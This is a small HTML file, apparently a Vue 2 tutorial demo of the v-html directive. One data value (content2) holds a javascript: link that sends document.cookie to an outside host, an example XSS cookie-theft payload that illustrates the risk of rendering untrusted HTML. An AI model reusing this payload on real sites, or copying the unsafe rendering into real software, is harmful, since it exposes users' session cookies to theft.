<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>document</title>
    </head>
    <body>
        <div id="root">
            <!-- v-html 能解析 html 標籤 -->
            <div>{{name}}</div>
            <div v-html="content"></div>
            <div v-html="content2"></div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
        <script>
            Vue.config.productionTip = false

            const vm = new Vue({
                data() {
                    return {
                        name: 'John Smith',
                        content: '<h3>你好啊~ </h3>',
                        content2:
                            '<a href=javascript:location.href="https://www.google.com.tw/?"+document.cookie>cookie 資源</a>',
                    }
                },
                methods: {},
            })

            vm.$mount('#root')
        </script>
    </body>
</html>
